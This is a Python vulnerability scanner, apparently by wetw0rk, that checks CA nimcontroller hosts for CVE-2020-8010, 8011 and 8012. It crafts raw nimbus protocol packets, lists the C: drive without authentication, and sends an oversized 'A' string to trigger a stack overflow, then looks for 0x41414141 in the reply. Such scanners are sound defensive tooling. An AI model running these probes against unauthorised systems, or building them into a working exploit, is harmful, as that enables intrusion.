#!/usr/bin/env python3
#
# Program name   : Nimvuln
# Version        : 1.0
# Author         : wetw0rk
# Python Version : 3.4
# Designed OS    : Linux
# Crash chance   : 00.01%
#
# Description:
#   This script was written to test if a nimcontroller is vulnerable
#   to CVE-2020-8010, CVE-2020-8011, and CVE-2020-8012. If a host is
#   vulnerable to 8010, and 8012 assume it is vulnerable to 8011.
#

# vuln checker

import os
import sys
import time
import socket
import argparse

class vulnerability_scanner():

  def __init__(self, targets, port):
    self.hosts = targets
    self.port = port

  def generate_probe(self, probe, args):

    client = "127.0.0.1/1337\x00"
    packet_args = ""
    probe += "\x00"

    for i in range(len(args)):
      arg = args[i]
      c = ""
      i = 0

      while (c != "="):
        c = arg[i]
        i += 1

      packet_args += "{:s}\x00".format(arg[:(i-1)])
      packet_args += "1\x00{:d}\x00".format(len(arg[i:])+1)
      packet_args += "{:s}\x00".format(arg[i:])

    packet_header = "nimbus/1.0 {:d} {:d}\r\n"
    packet_body = (
    "mtype\x00"
    "7\x004\x00100\x00"
    "cmd\x00"
    )
    packet_body  += "7\x00{:d}\x00".format(len(probe))
    packet_body  += probe
    packet_body  += (
    "seq\x00"
    "1\x002\x000\x00"
    "ts\x00"
    "1\x0011\x00RIGAMORTIS\x00"
    "frm\x00"
    )
    packet_body  += "7\x00{:d}\x00".format(
      len(client)
    )
    packet_body  += client
    packet_body  += (
    "tout\x00"
    "1\x004\x00180\x00"
    "addr\x00"
    "7\x000\x00"
    )
    packet_args   = packet_args

    packet_header = packet_header.format(
      len(packet_body),
      len(packet_args)
    )

    probe = packet_header + packet_body + packet_args

    return bytes(probe, 'latin1')

  def get_nimbus_version(self, host):

    check = self.generate_probe("get_info", [])
    r = self.send(host, check)

    nimbus_version = r.decode().split("\x00")

    try:
      p_error(f"{host} - OS has not been tested, verify manually: {nimbus_version[67]}")
    except:
      p_error(f"{host} - Failed to extract nimbus version")

    exit(-1)

  def get_target_os(self, host):

    os = self.generate_probe("os_info", [])
    r = self.send(host, os)

    if b"Windows" not in r:
      self.get_nimbus_version(host)
    os_detected = r.decode().split('\x00')
    p_info(f"{host} - OS detected: {os_detected[len(os_detected)-6]}")

    return

  def send(self, target, packet):

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
      sock.settimeout(8)
      sock.connect((target, self.port))
      sock.send(packet)

      r = sock.recv(4096)
    except:
      p_error(f"{target} - Failed to connect to host")
      r = b"ERROR"

    return r

  def check_cve_2020_8010(self, host):

    check = self.generate_probe("directory_list", ["directory=C:\\"])
    r = self.send(host, check)

    if b"entry" in r:
      p_good(f"{host} - vulnerable to CVE-2020-8010")
    else:
      return -1

    return 1

  def check_cve_2020_8012(self, host):

    payload  = "A" * 1024
    payload += "AAAA"

    check = self.generate_probe("directory_list", [("directory=%s" % payload)])
    r = self.send(host, check)

    if b'1094795585' in r:
      p_good(f"{host} - vulnerable to CVE-2020-8012")
    else:
      return -1

    return 1

  def scan(self):

    for i in range(len(self.hosts)):
      self.get_target_os(self.hosts[i])
      self.check_cve_2020_8010(self.hosts[i])
      time.sleep(1)
      self.check_cve_2020_8012(self.hosts[i])


class ReadFfile():

  def __init__(self, filename):
    self.filename = filename
    self.targlist = []

  def check_exists(self):
    if os.path.isfile(self.filename) is False:
      p_error("error occured when reading input file\n")
      exit(1)
    return

  def check_dups(self):
    listlen = len(self.targlist)
    sortit = list(set(self.targlist))
    self.targlist = sortit

    p_info(f"dup check done - target list before: {listlen}, target list after {len(self.targlist)}")

    return

  def inputf(self):
    self.check_exists()
    address_file = open(self.filename)
    address_list = address_file.readlines()
    for address in address_list:
      self.targlist += (address.rstrip()),
    self.check_dups()

    return self.targlist

def p_error(string):
  print("\033[1m\033[31m[-]\033[0m {:s}".format(string))

def p_info(string):
  print("\033[1m\033[94m[*]\033[0m {:s}".format(string))

def p_good(string):
  print("\033[1m\033[92m[+]\033[0m {:s}".format(string))

def main():

  parser = argparse.ArgumentParser(description="Nimvuln - Scanner for CVE-2020-8010, CVE-2020-8011, and CVE-2020-8012")
  parser.add_argument("-iL", "--input-file", help="input file containing IP's to be tested")
  parser.add_argument("-t", "--target", help="use this to query a single host")
  parser.add_argument("-p", "--port", help="target port")

  args = parser.parse_args()

  if len(sys.argv) < 4:
    parser.print_help()
    exit(0)

  target_list = args.input_file
  target = args.target
  port = int(args.port)

  if target_list:
    reader = ReadFfile(target_list)
    targets = reader.inputf()
  elif target:
    targets = [target]
  else:
    p_error("Need a target or target list")
    exit(1)

  vulnerability_scanner(targets, port).scan()

main()
